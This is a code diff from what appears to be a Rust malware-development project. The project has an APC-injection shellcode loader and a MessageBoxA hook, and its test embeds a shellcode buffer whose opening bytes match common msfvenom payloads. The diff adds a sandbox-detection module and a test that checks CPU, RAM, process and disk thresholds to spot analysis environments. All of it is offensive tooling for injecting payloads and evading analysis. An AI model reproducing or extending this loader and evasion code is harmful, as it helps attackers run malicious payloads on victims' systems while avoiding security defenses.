@@ -20,9 +20,11 @@ pub mod hook_message_box_a_hook{
     }
 }
 
+mod sandbox;
+
 #[cfg(test)]
 mod tests{
-    use crate::{hook_message_box_a_hook::hook_message_box_a_hook, loader_apc::apc};
+    use crate::{hook_message_box_a_hook::hook_message_box_a_hook, loader_apc::apc, sandbox::is_sandbox};
     #[test]
     pub fn test_loader_apc(){
         let buf: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
@@ -60,5 +62,15 @@ mod tests{
         }
 
         hook_message_box_a_hook(hello);
+    }
+
+    #[test]
+    pub fn test_is_sandbox(){
+        const MAX_CPU_COUNT:u32=4;
+        const MAX_RAM_SIZE:u32=8;
+        const MAX_PROCESS_COUNT:u32=100;
+        const MAX_DISK_SIZE:u32=60;
+
+        println!("isSandbox?{}!",is_sandbox(MAX_CPU_COUNT, MAX_RAM_SIZE, MAX_PROCESS_COUNT, MAX_DISK_SIZE));
     }
 }
